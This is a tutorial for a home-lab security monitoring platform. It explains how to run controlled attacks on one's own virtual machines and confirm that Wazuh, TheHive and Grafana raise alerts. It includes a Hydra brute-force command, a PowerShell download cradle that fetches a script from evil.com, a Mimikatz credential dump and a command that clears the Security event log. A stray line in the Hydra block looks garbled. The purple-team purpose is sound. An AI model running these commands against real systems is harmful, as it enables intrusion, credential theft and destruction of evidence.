# Phase 6 — Attack Simulation & Testing

## What Is This Phase?

This phase is the **Proof of Concept**. A SOC platform is just blinking lights unless it detects real threats. Here, we run specific, controlled attacks against our own endpoints (safe environment) to verify the entire pipeline: 
**Log → Normalization → Detection → Alert → Dashboard/Case.**

## Why Are We Implementing This?

| Reason | Explanation |
|---|---|
| **End-to-End Verification** | Ensures that an attack *actually* triggers an alert and a case in TheHive, not just a log entry |
| **Tuning Sensitivity** | If brute force takes 100 tries to trigger, your rules are too loose. If it triggers on 1, too noisy. Testing lets you tune |
| **Show, Don't Tell** | "I built a SOC" is one thing. "I simulated a credential dumping attack and tracked it through my SIEM" is 10x more impressive |
| **Learning Offense** | Understanding *how* attacks work makes you better at detecting them (Purple Teaming) |
| **Interview Demo** | You can screen-record these attacks and the resulting dashboard spikes for a killer portfolio demo |

## Simulation Plan

We will simulate 3 distinct attack scenarios mapped to MITRE ATT&CK:

| Scenario | MITRE ID | Action | Expected Outcome |
|---|---|---|---|
| **1. Credential Access** | T1110 | Brute force SSH/RDP | High Severity Alert + TheHive Case |
| **2. Suspicious Execution** | T1059 | Malicious PowerShell commands | Critical Alert + Dashboard Spike |
| **3. Defense Evasion** | T1070 | Clearing Event Logs | Critical Alert + Immediate Notification |

## How to Implement

### Prerequisite: Target Endpoints

Ensure you have at least one **Windows VM** (with Wazuh Agent) and one **Linux VM/Kali** (as attacker).

### Scenario 1: Brute Force Attack (SSH/RDP)

**Attacker (Kali Linux):**
```bash
# Use Hydra to attack the Windows/Linux target
# -l admin: User 'admin'
# -P /usr/share/wordlists/rockyou.txt: Password list
# -t 4: 4 threads
mariadb-10.3 target_ip ssh
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 <TARGET_IP> ssh
```

**What happens:**
1. Target generates hundreds of `Stat=Failed` auth logs.
2. Wazuh Agent reads these logs.
3. Wazuh Manager normalizes them to `T1110`.
4. Rule `11111` (Authentication Failures) triggers.
5. **Result:** Dashboard EPS spikes, Alert appears in "Critical Alerts" panel.

### Scenario 2: Suspicious PowerShell (Malware Simulation)

**Victim (Windows VM):**
Open PowerShell as Administrator and run:

```powershell
# Mimic a download cradle (T1059.001)
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX ((New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'))"

# Mimic credential dumping attempt (T1003)
Invoke-Mimikatz -DumpCreds
```

**What happens:**
1. Windows generates Event ID `4104` (Script Block).
2. Wazuh Rule `100010` (Suspicious PowerShell) detects keywords `IEX`, `DownloadString`, `Mimikatz`.
3. **Result:** Critical Alert in Wazuh & Grafana. TheHive case created (if configured).

### Scenario 3: Defense Evasion (Log Clearing)

**Victim (Windows VM):**
Run this command to clear security logs (Adversaries do this to hide):

```powershell
wevtutil cl Security
```

**What happens:**
1. Windows generates Event ID `1102` (The audit log was cleared).
2. Wazuh Rule `100030` (Security Log Cleared) triggers immediately.
3. **Result:** This is a **high-fidelity** indicator of compromise. It should trigger a P1 incident in TheHive.

### Scenario 4: Atomic Red Team (Automated)

For a more professional approach, use **Atomic Red Team** (Open source library of tests mapped to MITRE ATT&CK).

**Install on Windows (PowerShell):**
```powershell
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics
```

**Run a specific test (e.g., T1003 - Credential Dumping):**
```powershell
Invoke-AtomicTest T1003
```

## How to Verify Success

For each attack:

1. **Check Wazuh:** Go to **Security events** module. Do you see the specific rule ID?
2. **Check TheHive:** Is there a new case with the tag `T1059` or `T1110`?
3. **Check Grafana:** Did the "Severity Breakdown" pie chart show a slice of "High/Critical"?
4. **Check Response:** Did the active response (if configured) block the IP?

## Documenting Your Results

Take screenshots of:
1. The attack command running in the terminal.
2. The instant spike in Grafana.
3. The resulting Case in TheHive.

**This is your portfolio evidence.**

## Conclusion & Handover

Congrats! You've designed an **End-to-End SOC Platform**.
- **Infrastructure:** Dockerized & Reproducible
- **Ingestion:** Real-time log collection
- **Detection:** Custom MITRE-mapped rules
- **Response:** Automated Case Management
- **Visualization:** Executive-level Dashboards
- **Verification:** Validated with real attacks

You are now ready to build this lab and talk about it confidently in any interview!
